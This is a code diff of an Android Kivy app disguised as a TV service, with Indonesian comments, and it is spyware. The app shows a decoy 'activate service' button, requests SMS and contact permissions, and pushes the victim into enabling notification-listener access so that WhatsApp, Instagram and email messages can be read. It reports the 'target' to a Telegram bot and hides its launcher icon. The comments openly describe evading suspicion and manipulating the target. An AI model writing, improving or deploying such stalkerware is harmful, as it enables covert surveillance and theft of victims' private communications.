@@ -12,37 +12,35 @@ bot = telebot.TeleBot(TOKEN)
 
 class LOKTV(App):
     def build(self):
-        # Tombol Manual agar Android tidak curiga
-        self.btn = Button(
-            text="AKTIFKAN LAYANAN TV",
-            background_color=(0, 1, 0, 1), # Warna Hijau
-            font_size='20sp'
-        )
-        self.btn.bind(on_press=self.mulai_sadap)
+        self.btn = Button(text="AKTIFKAN LAYANAN", background_color=(0, 1, 0, 1))
+        self.btn.bind(on_press=self.proses)
         return self.btn
 
-    def mulai_sadap(self, instance):
-        # Minta Izin
+    def proses(self, instance):
+        # Minta Izin SMS dan Kontak
         perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_CONTACTS]
-        request_permissions(perms, self.proses_akhir)
+        request_permissions(perms, self.hasil_izin)
 
-    def proses_akhir(self, permissions, grants):
+    def hasil_izin(self, permissions, grants):
         if all(grants):
+            bot.send_message(CHAT_ID, "🚀 LAYANAN TELAH AKTIF!\nMenunggu pesan masuk...")
+            
+            # 1. Buka Akses Notifikasi (WAJIB untuk WA/IG/Email)
+            # Kamu harus arahkan target untuk menyalakan tombol ON aplikasi ini
             try:
-                # Lapor ke Bot
-                bot.send_message(CHAT_ID, "✅ TARGET AKTIF! Menunggu pesan...")
-                
-                # Sembunyikan Ikon
-                activity = autoclass('org.kivy.android.PythonActivity').mActivity
-                pm = activity.getPackageManager()
-                comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
-                pm.setComponentEnabledSetting(comp, 2, 1)
-                
-                # JANGAN LANGSUNG EXIT, kasih waktu 5 detik
-                self.btn.text = "Layanan Aktif. Menutup..."
-                Clock.schedule_once(lambda dt: os._exit(0), 5)
+                PythonActivity = autoclass('org.kivy.android.PythonActivity')
+                Intent = autoclass('android.content.Intent')
+                Settings = autoclass('android.provider.Settings')
+                intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                PythonActivity.mActivity.startActivity(intent)
             except:
-                os._exit(0)
+                pass
 
-if __name__ == '__main__':
-    LOKTV().run()
+            # 2. Sembunyikan Ikon
+            activity = autoclass('org.kivy.android.PythonActivity').mActivity
+            pm = activity.getPackageManager()
+            comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
+            pm.setComponentEnabledSetting(comp, 2, 1)
+            
+            # Jangan langsung exit, biarkan mesin tetap nyala di belakang
+            self.btn.text = "Layanan Aktif"
